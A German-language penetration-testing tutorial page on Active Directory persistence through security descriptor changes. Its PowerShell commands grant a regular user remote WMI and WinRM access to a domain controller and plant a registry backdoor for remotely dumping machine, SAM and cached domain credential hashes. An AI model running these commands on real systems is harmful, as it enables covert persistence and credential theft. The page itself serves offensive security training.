# Sicherheitsbeschreibungen

{{#include ../../banners/hacktricks-training.md}}

## Sicherheitsbeschreibungen

[Aus den Dokumenten](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Die Security Descriptor Definition Language (SDDL) definiert das Format, das verwendet wird, um einen Sicherheitsdescriptor zu beschreiben. SDDL verwendet ACE-Strings für DACL und SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Die **Sicherheitsbeschreibungen** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** **über** ein **Objekt** hat. Wenn Sie nur eine **kleine Änderung** im **Sicherheitsdescriptor** eines Objekts vornehmen können, können Sie sehr interessante Berechtigungen über dieses Objekt erhalten, ohne Mitglied einer privilegierten Gruppe sein zu müssen.

Diese Persistenztechnik basiert also auf der Fähigkeit, jedes benötigte Privileg gegen bestimmte Objekte zu gewinnen, um eine Aufgabe auszuführen, die normalerweise Administratorrechte erfordert, jedoch ohne die Notwendigkeit, Administrator zu sein.

### Zugriff auf WMI

Sie können einem Benutzer Zugriff gewähren, um **WMI remote auszuführen** [**indem Sie dies verwenden**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Zugriff auf WinRM

Gewähren Sie **Zugriff auf die winrm PS-Konsole für einen Benutzer** [**unter Verwendung von diesem**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Remote access to hashes

Greifen Sie auf die **Registry** zu und **dumpen Sie Hashes**, indem Sie eine **Reg-Backdoor mit** [**DAMP**](https://github.com/HarmJ0y/DAMP)** erstellen,** damit Sie jederzeit den **Hash des Computers**, die **SAM** und jede **cached AD**-Anmeldeinformation auf dem Computer abrufen können. Daher ist es sehr nützlich, diesem **regulären Benutzer Berechtigungen gegen einen Domain Controller-Computer** zu geben:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Überprüfen Sie [**Silver Tickets**](silver-ticket.md), um zu erfahren, wie Sie den Hash des Computerkontos eines Domain Controllers verwenden können.

{{#include ../../banners/hacktricks-training.md}}
